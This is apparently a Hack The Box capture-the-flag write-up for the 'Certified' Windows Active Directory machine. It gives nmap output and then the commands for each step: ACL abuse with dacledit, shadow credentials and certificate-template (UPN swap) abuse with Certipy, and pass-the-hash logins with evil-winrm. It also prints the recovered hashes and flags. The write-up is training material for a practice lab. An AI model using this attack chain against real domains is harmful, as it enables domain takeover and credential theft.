+++
title = "HTB - Certified"
date = 2024-12-16
+++

### Scan
```
nmap -sV -sC -p- --open 10.10.11.41 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-24 10:54 EST
Nmap scan report for 10.10.11.41
Host is up (0.12s latency).
Not shown: 65514 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-24 22:58:14Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-11-24T22:59:44+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-11-24T22:59:44+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-11-24T22:59:44+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-11-24T22:59:44+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
49716/tcp open  msrpc         Microsoft Windows RPC
49740/tcp open  msrpc         Microsoft Windows RPC
49773/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s
| smb2-time: 
|   date: 2024-11-24T22:59:04
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 301.95 seconds
```

### Enumeration
Breached Access Credentials: `judith.mader:judith09`
Start with validating credentials, then Bloodhound
Relations to `management_svc`. Abuse WriteOwner Privilege and add Judith to the Management Group as an owner using Impacket's dacledit and Samba's net rpc. Leverage for NT Hash through Certipy. Logon with EvilWINRM
```
python3 dacledit.py -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' 'certified.htb'/'judith.mader':'judith09'

net rpc group addmem "Management" "judith.mader" -U "certified.htb"/"judith.mader"%"judith09" -S "DC01.certified.htb"

certipy-ad shadow auto -username 'judith.mader@certified.htb' -p judith09 -account management_svc

evil-winrm -i 10.10.11.41 -u 'management_svc' -H 'a091c1832bcdd4677c28b5a6a1295584'
```
USER:`e8289ea0b3a120dac9c4abe02113d219`

### Privilege Escalation
We can completely maniputate `CA_Operator` as seen through BloodHound. Change the password of the account, and validate change by listing SMB shares: `net user CA_Operator password /domain`

Once here, we can begin to frame the attack we need by gathering details about the certificates via `certipy`:
`certipy-ad find -u judith.mader@certified.htb -p judith09 -dc-ip 10.10.11.41`
We get the naming structure - `certified-DC01-CA`, and we find that there is NoSecurityExtension for the Enrollment Flag.
This means that we can leverage `Certipy` to update the CA account through the SVC account, because it has the privileges to do so:
`certipy-ad account update -username management_svc@certified.htb -hashes 'a091c1832bcdd4677c28b5a6a1295584' -user CA_Operator -upn Administrator`
Just a quick note, Certipy requires appending the domain to usernames for syntax
Request the certificate: `certipy-ad req -username ca_operator@certified.htb -password 'password' -ca certified-DC01-CA  -template CertifiedAuthentication -debug`
Pass it with Certipy: `certipy-ad auth -pfx administrator.pfx  -domain certified.htb`
If Clock-Skew Happens, address with:
```
timedatectl set-ntp off
rdate -n 10.10.11.41
[COMMAND]
```
We get a hash. Pass with Evil-Winrm: `evil-winrm -i 10.10.11.41 -u 'Administrator' -H '0d5b49608bbce1751f708748f67e2d34'`

ROOT:`ddaed6bce93c26c940c6194afd2506ca`



